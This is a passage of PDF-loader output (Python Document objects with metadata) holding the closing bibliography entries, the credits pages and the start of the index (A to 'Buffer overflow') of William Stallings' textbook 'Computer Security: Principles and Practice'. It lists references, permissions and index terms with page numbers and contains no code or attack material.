Proceedings, ASIACRYPT ’00, 2000.\\nWALK05 Walker, J. “802.11 Security Series. Part III: AES-based Encapsulations of \\n802.11 Data.” Platform Networking Group, Intel Corporation, 2005.\\nWANG05 Wang, X.; Yin, Y.; and Yu, H. “Finding Collisions in the Full SHA-1. Proceed-\\nings, Crypto ’05, 2005; published by Springer-Verlag.\\nWEA V03 Weaver, N., et al. “A Taxonomy of Computer Worms.” The First ACM \\n Workshop on Rapid Malcode (WORM), 2003.\\nWEIR09 Weir, M., et al. “Password Cracking Using Probabilistic Context-Free \\n Grammars.” IEEE Symposium on Security and Privacy, 2009.\\nWHEE03 Wheeler, D. Secure Programming for Linux and UNIX HOWTO , Linux \\nDocumentation Project, 2003.\\nWHIT99 White, S. Anatomy of a Commercial-Grade Immune System. IBM Research \\nWhite Paper, 1999.\\nWHIT13 Whitham, B., “Automating the Generation of Fake Documents to Detect \\nNetwork Intruders.” International Journal of Cyber-Security and Digital \\nForensics, 2013.\\nWIEN90 Wiener, M. “Cryptanalysis of Short RSA Secret Exponents.” IEEE \\n Transactions on Information Theory, Vol. IT-36, 1990.\\nWORL04 The World Bank. Technology Risk Checklist. May 2004.\\nYANG12 Yang, K., and Jia, X. “Attributed-Based Access Control for Multi- Authority \\nSystems in Cloud Storage.” 32nd IEEE International Conference on \\n Distributed Computing Systems, 2012.\\nYUAN05 Yuan, E., and Tong, J. “Attribute Based Access Control (ABAC) for Web \\n Services.” Proceedings of the IEEE International Conference on Web  Services, \\n2005.\\nZHAN10 Zhang, Y.; Monrose, F.; and Reiter, M. “The Security of Modern Password \\nExpiration: An Algorithmic Framework and Empirical Analysis.” ACM \\n Conference on Computer and Communications Security, 2010.\\nZHOU04 Zhou, J., and Vigna, G. “Detecting Attacks that Exploit Application-Logic \\nErrors Through Application-Level Auditing.” Proceedings of the 20th Annual \\nComputer Security Applications Conference (ACSAC’04), 2004.\\nZOU05 Zou, C., et al. “The Monitoring and Early Detection of Internet Worms.” \\nIEEE/ACM Transactions on Networking, October 2005.\\nZ04_STAL0611_04_GE_BIB.indd   776 10/11/17   3:29 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 778, 'page_label': '777'}, page_content='777\\nCredits\\np. 30: Table 01.01: Computer Security Terms based on Stallings, \\nWilliam, Computer Security: Principles and Practice, 4e., ©2019. \\nReprinted and electronically reproduced by permission of \\n pearson education, inc., new york, ny.\\np. 032: Table 01.02: Threat Consequences based on RFC 4949.\\np. 038: Table 01.04: Security Requirements based on FIPS 200. \\nhttp://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.200.pdf.\\np. 83: Exercise: Problem 2.7: “This problem introduces a hash \\nfunction\\xa0 .\\xa0 .\\xa0 .\\xa0 ” based on Mason, WK., and The American \\n Cryptogram Association.\\np. 115: Figure 03.12: Actual Biometric Measurement Operating \\nCharacteristic Curves based on [MANSO1]. Mansfield, T., Kelly, \\nG., Chandler, D., and Kane, J. Biometric Product Testing Final \\nReport. National Physics Laboratory, United Kingdom, March \\n2001. United Kingdom National Archives, Open Government \\nLicence v3.0,\\np. 116: Figure 03.13: Basic Challenge-Response Protocols for \\nRemote User Authentication based on [OGOR03].\\np. 129: Table 04.01: Access Control Security Requirements (SP \\n800-171) based on NIST SP 800-171 Protecting Controlled \\nUnclassified Information in Nonfederal Information Systems \\nand Organizations, December 2016 National Institute of Stan -\\ndards and Technology (NIST), United States Department of \\nCommerce.\\np. 130: Figure 04.01: Relationship Among Access Control and \\nOther Security Functions based on [SAND94].\\np. 229: “Distributed denial-of-service (DDoS) attacks\\xa0.\\xa0.\\xa0.\\xa0” based \\non SOURCE: From [HONE05] The Honeynet Project. Know -\\ning Your Enemy: Tracking Botnets. Honeynet White Paper, \\nMarch 2005. http://honeynet.org/papers/bots. Uses of botnets. \\nhttp://honeynet.org/node/52\\np. 235: Three Techniques That Used to Change System based on \\n[LEVI06] Levine, J.; Grizzard, J.; and Owen, H. “Detecting and \\nCategorizing Kernel-Level Rootkits to Aid Future Detection.” \\nIEEE Security and Privacy, January–February 2006, Page(s):  \\n24–32 http://ieeexplore.ieee.org/document/1588822/\\np. 276: “Performing a remote root  compromise\\xa0.\\xa0.\\xa0.\\xa0” based on \\nNIST SP 800-61 (Computer Security Incident Handling Guide, \\nAugust 2012). National Institute of Standards and Technology, \\nUnited States Department of Commerce.\\np. 278: Definitions: security intrusion/intrusion detection based \\non SOURCE: From RFC 2828 Internet Security Glossary. \\nCopyright (C) The IETF Trust (2007). Internet Society.\\np. 281: “Run continually with minimal human\\xa0 .\\xa0 .\\xa0 .\\xa0 ” based on \\n[BALA98] Balasubramaniyan, J., Jose Omar Garcia-Fernandez, \\nDavid Isaco, Eugene Spa ord, Diego Zamboni. “An Architecture \\nfor Intrusion Detection Using Autonomous Agents.” Proceedings, \\n14th Annual Computer Security Applications Conference, 1998. \\nThe Institute of Electrical and Electronics Engineers, Inc. (IEEE).\\np. 282: “Statistical: Analysis of the observed\\xa0 .\\xa0 .\\xa0 .\\xa0 ” based on  \\n[GARC09] Garcia-Teodoro, P ., et al. “Anomaly-based  network \\nintrusion detection:  Techniques, systems and challenges” ,  \\nComputer & Security, vol. 28, 2009. Elsevier. http://www  \\n. sciencedirect.com/science/journal/01674048.\\np. 291: Figure 08.04: Passive NIDS Sensor based on [CREM06].\\np. 293: “Application layer reconnaissance and attacks\\xa0 .\\xa0 .\\xa0 .\\xa0 ” \\nbased\\xa0 on NIST Special Publication SP 800-94, SP 800-94 \\nrev 1 (draft), July 2012. National Institute of Standards and \\n Technology, United States Department of Commerce.\\np. 294: “Denial-of-service (DoS) attacks\\xa0 .\\xa0 .\\xa0 .\\xa0 ” based on NIST \\nSpecial Publication SP 800-94, SP 800-94 rev 1 (draft), July 2012. \\nNational Institute of Standards and Technology, United States \\nDepartment of Commerce.\\np. 312: “All traffic from inside to outside\\xa0 .\\xa0 .\\xa0 .\\xa0 ” based on \\n[BELL94] Bellovin, S., and Cheswick, W. “Network Firewalls.” \\nIEEE  Communications Magazine, September 1994. The Insti -\\ntute of Electrical and Electronics Engineers, Inc. (IEEE).\\np. 312: “IP Address and Protocol  Values\\xa0.\\xa0.\\xa0.\\xa0” based on NIST SP \\n800-41 (Guidelines on Firewalls and Firewall Policy, September \\n2009). National Institute of Standards and Technology, United \\nStates Department of Commerce.\\np. 332: Figure 09.05: Placement of Malware Monitors Security \\nand Privacy based on [SIDI05]. Sidiroglou, S., and Keromytis, \\nA. “Countering Network Worms Through Automatic Patch \\nGeneration.” , Columbia University, Figure 1, page 3, November- \\nDecember 2005. http://www1.cs.columbia.edu/~angelos/Papers/ \\n2005/j6ker3.pdfIEEE\\np. 333: Figure 09.06: Unified Threat Management Appliance \\nbased on [JAME06].\\np. 343: Buffer overrun based on NIST Glossary of Key \\n Information Security Terms National Institute of Standards and \\nTechnology, United States  Department of Commerce.\\np. 358: C programming text from Knoppix Linux system, Pen -\\ntium processor, using the GNU GCC compiler and GDB debug-\\nger. The Free Software Foundation (FSF) GCC gcc@gcc.gnu.\\norg. CC BY-ND 3.0. Creative Commons Attribution-No Deriva-\\ntive Works 3.0 license.\\np. 412: Script Codes from CGI script, XSS UNIX finger \\n commands codes.\\np. 423: “Install and patch the operating system\\xa0 .\\xa0 .\\xa0 .\\xa0 ” based \\non Scarfone, K., Jansen, W., and Tracy, M. Guide to General \\nServer Security, NIST Special Publication 800-123, July 2008. \\nNational Institute of Standards and Technology, United States \\n Department of Commerce.\\np. 446: Cloud computing based on NIST SP-800-145 (The \\nNIST Definition of Cloud Computing, September 2011). \\nNational Institute of Standards and Technology, United States \\n Department of Commerce.\\np. 451: The NIST cloud computing reference architecture \\nfocuses\\xa0.\\xa0.\\xa0.\\xa0based on NIST SP 500-292 (NIST Cloud  Computing \\nReference Architecture, September 2011). National Institute \\nof Standards and Technology, United States  Department of \\nCommerce.\\nZ15_STAL0611_04_GE_CRED.indd   777 10/11/17   4:41 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 779, 'page_label': '778'}, page_content='778  CREDITS\\np. 458: Cloud-specific security threats based on The Cloud \\n Security Alliance [CSA13]. Cloud Security Alliance. The \\n Notorious Nine Cloud Computing T op Threats in 2013. CSA \\nReport, February 2013. https://downloads.cloudsecurityalliance \\n.org/initiatives/top_threats/The_Notorious_Nine_Cloud_  \\nComputing_Top_Threats_in_2013.pdf.\\np. 482: Standard: IT security management based on ISO 13335 \\n(Management of information and communications technol -\\nogy security). International Organization for Standardization.  \\n© William Stallings.\\np. 484: Process steps for managing information security \\nthat\\xa0.\\xa0.\\xa0.\\xa0adapted from table 1 in ISO 27005 and part of figure\\xa01 \\nin ISO 31000.\\np. 485: Organizational security policy topics\\xa0.\\xa0.\\xa0.\\xa0. adapted from \\nthe details provided in various sections of ISO 13335.\\np. 530: Three elements of information system\\xa0 .\\xa0 .\\xa0 .\\xa0 based on \\nPlatt, F. “Physical Threats to the Information Infrastructure.” In \\n Bosworth, S.; Kabay, M.; and Whyne, E., eds. Computer Security \\nHandbook. New York: Wiley, 2009.\\np. 532: Table 16.01: Characteristics of Natural Disasters based \\non data from ComputerSite Engineering, Inc.\\np. 534: Table 16.04: Temperature Thresholds for Damage to \\nComputing Resources based on data from National Fire Protec-\\ntion Association.\\np. 538: Fire and Smoke measures based on MARTIN, SECURITY, \\nACCURACY, AND PRIVACY IN COMPUTER SYSTEMS., \\n1st, ©1974. Printed and Electronically reproduced by permission \\nof Pearson Education, Inc., Upper Saddle River, New Jersey.\\np. 544: Figure 16.03: Convergence Example based on [FORR06].\\np. 549: Table 16.07: World Bank Physical Security Checklist \\nbased on SOURCE: From “World Bank Integrator Unit and \\nTRE Security Team Collaboration. 2004. Technology Risk \\nChecklist 7 .3, pp. 13-14. © The World Bank. https://www.cccure \\n.org/Documents/tra/technologyriskchecklist.pdf License: Cre -\\native Commons Attribution license (CC BY 3.0 IGO).” World \\nBank Group. Used by permissions.\\np. 552: “Security awareness is explicitly required for all\\xa0 .\\xa0 .\\xa0 .\\xa0 ” \\nadapted from NIST SP 800-16 (Information Technology Secu -\\nrity Training Requirements: A Role- and  Performance-Based \\nModel). National Institute of Standards and Technology, United \\nStates Department of Commerce.\\np. 554: “Awareness tools are used to promote information\\xa0.\\xa0.\\xa0.\\xa0” \\nadapted from NIST SP 800-100, Information Security Handbook: \\nA Guide for Managers. National Institute of Standards and Tech-\\nnology, United States Department of Commerce.\\np. 555: “Goal 1: Raise staff awareness of information\\xa0.\\xa0.\\xa0.\\xa0” adapted \\nfrom Szuba, T. Safeguarding Your  Technology. National Center for \\nEducation Statistics, NCES 98-297 , 1998, nces.ed.gov/pubsearch/\\npubsinfo.asp?pubid=98297 U.S. Department of Education.\\np. 558: “Have an investigation agency\\xa0 .\\xa0 .\\xa0 .\\xa0 ” based on \\n Sadowsky, G. et al. Information Technology Security Hand -\\nbook.  Washington, DC: The World Bank, 2003 http://www.\\ninfodev-security.net/handbook. The International Bank for \\nReconstruction and Development.\\np. 560: Policy Issues based on [KING06].\\np. 562: “Responding to incidents systematically so\\xa0.\\xa0.\\xa0.\\xa0” based \\non Cichonski, P ., et al. Computer Security Incident  Handling \\nGuide. NIST Special Publication 800-61, August 2012. \\nNational  Institute of Standards and Technology, United States \\n Department of Commerce.\\np. 565: “Taking action to protect systems and networks\\xa0 .\\xa0 .\\xa0 .\\xa0 ” \\nbased on Carnegie-Mellon Software Engineering Institute. \\nHandbook for Computer Security Incident Response Teams \\n(CSIRTs). CMU/SEI-2003-HB-002, April 2003. Carnegie \\n Mellon  University Press.\\np. 571: Table 18.01: Security Audit Terminology based on \\n[NIST95] National Institute of Standards and Technology. An \\nIntroduction to Computer Security: The NIST Handbook. \\nSpecial Publication 800-12, October 1995. National Institute \\nof Standards and Technology, United States Department of \\nCommerce.\\np. 576: Code of Practice for Information Security Management \\nbased on ISO 27002 International Organization for Standard -\\nization (ISO).\\np. 580: “The date and time the access was attempted\\xa0.\\xa0.\\xa0.\\xa0” based \\non [NIST95] National Institute of Standards and Technology. \\nAn Introduction to Computer Security: The NIST Handbook. \\nSpecial Publication 800-12, October 1995. National Institute \\nof Standards and Technology, United States Department of \\nCommerce.\\np. 583: Figure 18.05: Windows System Log Entry Example based \\non Microsoft® Windows, Microsoft Corporation. Reprinted with \\npermission Microsoft Corporation.\\np. 584: “Robust filtering: Original syslog\\xa0.\\xa0.\\xa0.\\xa0” from Kent, K., and \\nSouppaya, M. Guide to Computer Security Log Management. \\nNIST Special Publication 800-92, September 2006. National \\nInstitute of Standards and Technology, United States Depart -\\nment of Commerce.\\np. 599: Figures 3: Command Codes from UNIX commands codes.\\np. 601: Computers as targets\\xa0.\\xa0.\\xa0.\\xa0from [DOJ00] U.S.  Department \\nof Justice.\\np. 621: Figure 19.06: ACM Code of Ethics and Professional \\n Conduct based on Excerpt reprinted courtesy of ACM, Inc.\\np. 622: Figure 19.08: AITP Standard of Conduct based on From \\nCopyright © 2006, Association of Information Technology \\nProfessionals. Association of Information Technology. Used by \\npermissions.\\np. 622: Figure 19.07: IEEE Code of Ethics based on Reprinted \\nwith permission of IEEE with the copyright notice © Copyright \\n2017 IEEE included.\\np. 625: Table 19.03: OECD Guidelines on the Protection of \\n Privacy based on OECD Guidelines on the Protection of Privacy \\nand Transborder Flows of Personal Data, Annex to the Recom-\\nmendation of the Council of 23rd September 1980: GUIDE -\\nLINES GOVERNING THE PROTECTION OF PRIVACY \\nAND TRANSBORDER FLOWS OF PERSONAL DATA, Part \\nTwo: Basic Principles of National Application http://www.oecd  \\n.org/sti/ieconomy/oecdguidelinesontheprotectionofprivacy  \\nandtransborderflowsofpersonaldata.htm.\\np. 649: “Hardware efficiency: Unlike the three chaining \\nmodes\\xa0.\\xa0.\\xa0.\\xa0” based on Lipmaa, H., Rogaway, P ., and Wagner, D. \\n“CTR Mode Encryption.” NIST First Modes of Operation Work-\\nshop, October 2000. National Institute of Standards and Technol-\\nogy, United States Department of Commerce.\\np. 663: Design objectives for HMAC from https://www.ietf.org/\\nrfc/rfc2104.txt.\\nZ15_STAL0611_04_GE_CRED.indd   778 10/11/17   4:41 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 780, 'page_label': '779'}, page_content='CREDITS  779\\np. 700: “A router advertisement\\xa0.\\xa0.\\xa0.\\xa0” based on Huitema, C. IPv6: \\nThe New Internet Protocol. Upper Saddle River, NJ: Prentice \\nHall, 1998. Pearson Education.\\nPage 724: “Wireless Network Threats” based on Choi, MK., \\nRobles, RJ., Hong, CH., Kim, TH. “Wireless Network Security: \\nVulnerabilities, Threats and Countermeasures.” International \\nJournal of Multimedia and Ubiquitous Engineering, July 2008. \\nScience & Engineering Research Support Society.\\np. 726: “Securing Wireless Networks” based on Choi, MK., \\nRobles, RJ., Hong, CH., Kim, TH. “Wireless Network Security: \\nVulnerabilities, Threats and Countermeasures.” International \\nJournal of Multimedia and Ubiquitous Engineering, July 2008. \\nScience & Engineering Research Support Society.\\np. 729: Figure 22.07: The Heartbleed Exploit based on From \\n“Heartbleed-The Open SSL Heartbeat Exploit” Copyright © 2014 \\nBAE Systems Applied Intelligence. Reprinted with permission.\\nZ15_STAL0611_04_GE_CRED.indd   779 10/11/17   4:41 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 781, 'page_label': '780'}, page_content='Index\\nA\\nAccess attributes, 135\\nAccess control, 38, 737 . See also Attribute-based access \\ncontrol (ABAC), Discretionary access control (DAC), \\nMandatory access control (MAC), Role-based access \\ncontrol (RBAC)\\naccess rights of subject, 132\\nadd-on security packages, 131\\nauditing function, 130\\nauthentication and, 129\\nauthorization and, 130\\ncontext for, 129\\ndatabase, 183–188\\ndefinitions, 128\\nto delete system resources, 132\\nenterprise-wide, 157\\nexamples, 134, 163\\nexecute access, 132\\nin Linux/Unix security, 431–432\\nobjects to be protected by, 132\\norganization of, 137\\npassword file, 99–100\\npolicies, 131\\nprinciples, 128–129\\nread access, 132\\nto search directory, 132\\nof UNIX file, case example, 139–143\\nin Windows security, 434\\nwrite access, 132\\nAccess control lists (ACLs), 133–134, 141–142, 151\\nAccess control subsystem, 544\\nAccessibility, 41, 384, 724\\nAccess management, 157\\nAccess matrix, 133–136, 143\\nAccess matrix controller, 136\\nAccess point (AP), 290, 397 , 404, 427 , 430, 433–434, 575,  \\n609, 733\\nassociation, 736\\nauthentication, 739\\nconnection termination, 740\\ndisassociation, 736\\ndiscovery, 739\\nkey management, 739\\nprotected data transfer, 740\\nreassociation, 736\\nAccess rights, 132\\nhierarchy of subjects, 138\\n‘owner’ access right, 138\\nrules, 136–138\\ntransfer-only right, 138\\nAccess rules, 131\\nAccidental association, 724\\nAccountability, 26, 38, 86, 485, 494, 516, 551, 617\\nAccount hijacking, 459\\nAccount logon events, 581, 583\\nAccount management, 583\\nAccreditation, 37–38, 521\\nACM Code of Ethics and Professional Conduct, 621\\nActive attacks, 31, 36–37\\nActive directory (AD), 433, 583\\nActivity, 299\\nActuator, 467\\nAddress space, 217 , 342, 350, 368–370, 372, 375, 574, 588, 591\\nAddress space randomization, 369–370\\nAdd Round Key stage (AES), 635–637\\nAd Hoc Committee on Responsible Computing, 623\\nAd hoc networks, 724\\nAdleman, Len, 71, 669\\nAdministrative management domain (ADMD), 688\\nAdministrator, 187 , 299\\nAdvanced, 209\\nAdvanced Encryption Standard (AES), 53, 55–57 , 435, 581, 628, \\n633, 635–641, 650\\nadd round key transformation, 640\\nAES Encryption Round, 637\\nencryption and decryption algorithms, 635\\nkey expansion algorithm, 641\\nmix column transformation, 640\\noverall structure of, 635\\noverview, 635–637\\nS-boxes, 638\\nshift row transformation, 638, 640\\nSubBytes transformation, 638\\nsubstitutions and permutation, 635\\nAdvanced Persistent Threats (APT), 209–210\\nAdversary (threat agent), 30, 32, 40, 42–43, 46, 89, 93, 104, 105, \\n115–119, 123, 676\\nAdware, 221, 223–223t, 336t, 604t\\nAES. See Advanced Encryption Standard (AES)\\nAgentless program, 596–597\\nAgent program, 597\\nAH information, 701\\nAITP Standard of Conduct, 622\\nAlarm processor, 573\\nAlert, 299\\nAlerting, 595\\nAlert Protocol, TLS, 692\\nAlgorithms, 607\\ncorrect implementation of, 396–398\\ncorrespondence between machine language and, 398\\nAlternative message formats, 585\\nAmplification attacks, 264–265, 268\\nAmplifier attacks, 256\\nAnalysis approaches, 281–284\\nAnalyzers, 278, 299\\nAND-node, 44\\nAnomaly detection, 182–183, 283, 293, 330, 574, 595\\nattacks suitable for, 293\\ndetection phase, 282\\nknowledge-based analysis, 282\\nmachine-learning analysis, 282\\nSPA and, 294\\nstatistical analysis, 282\\ntraining phase, 282\\nAnonymity, 614\\nAnonymous, 275\\nAnswer to reset (ATR) message, 106\\nAntireplay window, 701\\nAnti-tamper and detection, 475\\nApplication and service configuration\\nin Linux/Unix security, 430\\nin Windows systems, 433–434\\nApplication-based bandwidth attacks, 258–261. See also  \\nDenial-of-service (DoS) attack\\nSIP flood, 258–259\\nApplication-level audit trail, 578–579\\nApplication-level gateway, 319\\nApplication owner, 186\\n780\\nZ16_STAL0611_04_GE_IDX.indd   780 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 782, 'page_label': '781'}, page_content='INDEX  781\\nApplication security\\napplication specific configuration, 427\\nencryption technology, 427–428\\nApplication traffic, 441\\nApprentice, 275\\nArchitectural works, copyrighted, 606\\nArchives, 429, 573\\nArtifacts, 623\\nArtificial Neural Networks (ANN), 285\\nAssessors, 161\\nAssets of a computer system, 29, 493–494\\nthreats and, 33–37\\nAssociation for Computing Machinery (ACM), 620–621\\nAssociation of Information Technology Professionals  \\n(AITP) Standard of Conduct, 620\\nAssurance, 48, 161, 384, 398, 489\\nevaluation and, 48\\nlevel for user authentication, 90–92, 158\\nsecurity auditing and, 571\\nAsymmetric encryption, 53, 71\\nAsymmetric encryption algorithms, 71–72. See also  \\nPublic-key encryption/cryptosystem\\nAtomic operation, software security, 409\\nAttack agent, 229–230, 256–257\\nbots, 229–230, 242, 260, 325\\nremote control facility, 230\\nzombies, 208, 229–230, 257, 269\\nAttack kit, 208–209\\nAttacks, 98. See also Countermeasures; Denial-of-service  \\n(DoS) attack; Software security; SQL injection  \\n(SQLi) attack; Threats; Vulnerabilities\\namplification, 264–265, 268\\namplifier, 256\\napplication-based bandwidth, 258–261\\napplication layer reconnaissance and, 293\\nbanner grabbing, 294\\nblended, 208\\nbots, 623\\nbrute-force, 55–56, 65, 66, 98, 583, 634\\ncategories, 695–697\\nciphertext-only, 629–630\\nclassic cross-site scripting (XSS), 413–414\\nclient, 118–119\\ncode injection, 389–390, 405\\ncommand injection, 388, 414\\ncross-site scripting (XSS), 391–392\\ncryptanalytic, 94\\ndefined, 30, 31\\ndetecting, 31\\ndistributed denial-of-service (DDoS), 229, 256–258\\nDNS amplification, 265\\nDomain name system (DNS), 293\\ndrive-by-download, 210, 223–224\\nflooding, 255–256\\non handshake protocol, 695\\nhost, 119\\nhypertext Transfer Protocol (HTTP)-based, 260–261, 293\\nICMP flood, 255\\ninband, 180\\ninferential, 181\\ninjection, 177–183, 386–390\\ninside, 31\\non Internet Relay Chat (IRC) networks, 229\\nman-in-the-middle, 678, 724\\nnetwork layer reconnaissance and, 293\\nnetwork security, 36–37\\noff-by-one, 371\\noffline dictionary, 92–93\\nother, 695–696\\nout-of-band, 182\\noutside, 31\\non PKI, 695\\npopular password, 93\\non record and application data protocols, 695\\nreflection, 261–264\\nreflector, 256, 261–264\\nremote code injection, 405\\nreplay, 119\\nscanning, 294\\nsecurity, 31, 36, 41, 44, 47\\nsoftware bugs, 382\\nsource routing, 317\\nspear-phishing, 232\\nspecific account, 93\\nSSL/TLS, 695–697\\nsuitable for anomaly detection, 294\\nSYN-FIN, 306\\nSYN spoofing, 252–255\\nTCP SYN spoofing, 254\\nthreat consequences of, 31–33\\ntiny fragment, 317\\ntransport layer reconnaissance and, 293\\nTrojan horse, 33, 118–119, 211, 221, 222, 224, 233, 329\\nwatering-hole, 226\\nXSS, 391–392\\nzero-day, 281, 283\\nAttack surfaces, 43–44\\nAttack trees, 44–46\\nAttended biometric (BIO-A), 545\\nAttribute-based access control (ABAC), 131, 148–154\\nadvantage of, 154\\nattributes in, 148\\ncontrast with RBAC approach, 153\\nflexibility of, 149\\nlogical architecture, 150–151\\npolicies, 150–151\\npolicy model, 151–154\\nAttribute certificates, 715\\nAttribute Exchange Network (AXN), 160\\nAttribute indexes, 193\\nAttribute providers (APs), 161\\nAttributes, 41, 44, 88, 110, 139, 149, 174–175, 188, 193, 251, 430,  \\n581, 594, 715\\nAudit, 38, 130. See also Security auditing\\nAudit analysis, 574\\nAudit analyzer, 573\\nAudit and alarms model (X.816), 572–573\\nAudit archiver, 573\\nAUDIT_CALL_START, 590\\nAudit dispatcher, 573\\nAUDIT_LOOKUP_COMMAND, 590\\nAuditors, 161\\nAudit provider, 573\\nAudit recorder, 572–573\\nAudit (log file) records, 284–285\\nAudit records, host-based intrusion detection and, 284–285\\nAudit review, 574, 594\\nAudit trail collector, 573\\nAudit trail examiner, 573\\nAudit trails, 578–580, 593\\nanalysis, 592–596\\nreview after an event, 593\\nAuthenticated encryption (AE), 666–669\\nAuthenticated session, 46\\nAuthentication, 38, 129, 475, 611, 737 . See also Message \\nAuthentication, User Authentication\\naccess control and, 129\\nbiometric, 109–114\\ndigital user, 87–92\\nhash function and, 59–67\\nZ16_STAL0611_04_GE_IDX.indd   781 10/11/17   3:40 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 783, 'page_label': '782'}, page_content='782  INDEX\\nAuthentication (Continued)\\nmessage or data, 59–64\\npassword-based, 92–104\\nprocess, steps for, 86\\npublic-key encryption, 63, 69\\nremote user, 114–117\\nsecurity issues for user, 117–119\\ntoken-based, 104–109\\nusing message encryption, 60–66\\nusing symmetric encryption, 59\\nAuthentication header (AH), 701\\nAuthentication protocol, 88, 90, 109\\nchallenge-response, 106\\nDiffie–Hellman key exchange, 676\\ndynamic biometric, 117\\ndynamic password generator, 105\\nprotocol type selection (PTS), 106\\nof a smart token, 106, 116\\nstatic, 105\\nstatic biometric, 117\\nAuthentication server (AS), 708, 743\\nAuthenticators, 118\\nAuthenticity, 25–26, 34, 60, 63, 232, 482, 485, 494\\nAuthorization, 129, 475–476\\naccess control and, 129\\ncascading, 185–186\\nAuthorization functions, 611\\nAutomatic response, 574\\nAutomatic teller machine (ATM), 104\\narchitectures, 122\\ncardholder, 121\\nissuer, 121\\nprocessor, 122\\nsecurity problems for, 121–124\\nAutonomic enterprise security system, 296\\nAuto-rooter, 207\\nAvailability, 24–28, 31, 33–35, 37–38, 47 , 171, 189, 191, 206, 229, \\n247–248, 257 , 275, 424, 482, 485, 494, 503–504, 506, 515, \\n526, 574–575, 584, 601\\nAwareness, 38\\nB\\nBackbone cabling, 196\\nBackbone network, 469\\nBackdoor (trapdoor), 32–33, 207 , 220, 233, 277 , 336\\nBackground checks and screening of employees, 557–558\\nBackscatter traffic, DoS, 252, 263\\nBackup, data, 429\\nBanner grabbing attack, 294\\nBarrier security, 730\\nBaseline approach, 488–489\\nBaselining, 595\\nBase-rate fallacy, 280–281\\nbehavior, 280\\nIDS problem of, 280–281\\nBasic principles, 279–280\\nBasic service set (BSS), 733\\ntransition, 736\\nBastion host, 320–321\\nBayesian networks, 283\\nBcrypt, 96\\nBehavior-blocking software, 240\\nBernstein, Daniel, 268\\nBilling/payments, 611\\nBiological viruses, 210\\nBiometric (BIO), 545\\nBiometric authentication system, 119\\naccuracy of, 111–114\\ncost vs. accuracy, 110\\ndynamic biometric protocol, 89, 117\\nfingerprint patterns, 110\\ngeneric, 112\\nhand geometry systems, 110\\niris system, 111, 119–121\\noperation of, 111\\npersonal identification number (PIN), 111, 112\\nphysical characteristics of, 110–111\\nretinal, 110\\nsignature, 110\\nstatic biometric protocol, 89, 117\\nusing facial characteristics, 110\\nverification (identification) of, 111\\nvoice pattern, 110\\nBiometric information, 108\\nBIOS code, 228\\nBitLocker, Windows security, 435\\nBlended attack, 208\\nBlinding, 674\\nBlind SQL injection, 181–182\\nBlizzard, 533\\nBlock cipher encryption, 58\\nblowfish symmetric, 96\\nBlock cipher modes of operation, 644–650\\nBlock ciphers, 55, 57 , 631, 633, 641–642, 663\\nBlock encryption algorithms, 53, 55–57 , 628, 631\\nBlock reordering, 59\\nBloom filter, 102–104\\nBlowfish symmetric block cipher, 96\\nBlue Pill rootkit, 236, 424\\nBoot sector infector, 214\\nBotnet, 208, 225, 229, 232, 242, 257 , 263\\nBots, 229–230, 242, 260, 325, 623\\nuses, 229\\nBourne shell, 357 , 361, 362\\nBring-your-own-device (BYOD) policy, 728\\nBrowser helper objects (BHOs), 229\\nBrunner, John, 216\\nBrute-force attack, 55, 56, 65, 98, 583, 634\\nBSD Syslog Protocol, 585\\nBuffer overflow, 343\\nattacks, 342–343, 347, 354, 357, 364, 368, 370–376\\nC code, 344\\ncompile-time defenses, 364–368\\ncountermeasures, 364–368\\ndefinition, 343\\nexample runs, 344\\nexploiting method, 346\\nexploits, 329\\nfunction call mechanisms, 348–349\\nglobal data area overflows, 375\\nheap, 372–375\\ninput size and, 385\\nno-execute (NX), 369\\nreplacement stack frame, 370–371\\nreturn to system call, 371–372\\nrun-time defenses, 368–370\\nshellcode, 